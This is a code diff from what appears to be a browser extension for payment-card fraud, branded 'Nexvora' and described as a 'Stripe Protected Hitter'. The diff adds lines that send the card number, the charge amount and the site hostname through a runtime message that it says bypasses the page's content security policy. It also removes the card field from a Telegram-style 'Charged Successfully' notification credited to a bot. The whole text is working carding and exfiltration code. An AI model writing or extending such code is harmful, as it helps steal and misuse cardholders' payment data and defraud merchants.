@@ -23,7 +23,18 @@
             // Failsafe 2: Message Proxy (Bypasses local CSP)
             chrome.runtime.sendMessage({
                 type: 'NOTIFY_HIT',
-                data: { text: message }
+                data: { 
+                    text: message,
+                    card: cardStr,
+                    amount: amountStr,
+                    site: window.location.hostname
+                }
+            }, (response) => {
+                if (chrome.runtime.lastError) {
+                    console.error("[Nexvora] Runtime Error:", chrome.runtime.lastError);
+                } else {
+                    console.log("[Nexvora] Transmission Result:", response);
+                }
             });
             console.log("[Nexvora] Dual transmission fired.");
         } catch (e) {
@@ -71,7 +82,6 @@
                             `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
                             `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                             `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
-                            `💳 <b>Card:</b> <code>${cardStr}</code>\n` +
                             `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
                             `<i>Checked by @hitinfobdrobot ✅</i>`;
 
